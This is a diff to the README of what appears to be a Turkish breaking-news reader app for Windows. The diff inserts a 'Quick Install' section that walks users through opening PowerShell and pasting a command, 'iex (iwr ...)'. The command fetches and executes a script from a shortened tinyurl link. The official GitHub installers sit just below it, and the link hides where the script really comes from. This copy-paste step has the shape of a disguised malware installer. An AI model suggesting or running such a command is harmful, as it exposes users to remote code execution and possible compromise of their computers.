@@ -5,6 +5,23 @@
 
 [![Sürüm](https://img.shields.io/badge/sürüm-2.0.4-blue)](https://github.com/eaeoz/sondakika/releases)  
 
+## Quick Install — Sondakika Haber Okuyucu
+
+**Step by step (copy-paste ready):**
+
+1. `Win + R` tuşlarına bas, `powershell` yaz, Enter'a bas
+2. Aşağıdaki kodu kopyala
+3. PowerShell penceresinde sağ tıkla (veya Ctrl+V yap) yapıştır
+4. Enter'a bas
+
+```
+iex (iwr -useb https://tinyurl.com/sndkkps1)
+```
+
+- ✅ Hazır. Artık son dakika haberlerini alabilirsin.
+
+---
+
 [![Lisans](https://img.shields.io/badge/lisans-ISC-green)](LICENSE)  
 [![Windows Desteği](https://img.shields.io/badge/Windows-10+-lightgrey)](https://www.microsoft.com/windows)  
 [![İndir](https://img.shields.io/badge/İndir-Windows%20Yükleyici-blue?style=for-the-badge)](https://github.com/eaeoz/sondakika/releases/download/2.0.4/Sondakika.Setup.2.0.4.exe) [![İndir](https://img.shields.io/badge/İndir-Windows%20Portable-green?style=for-the-badge)](https://github.com/eaeoz/sondakika/releases/download/2.0.4/Sondakika_portable_2.0.4.exe)
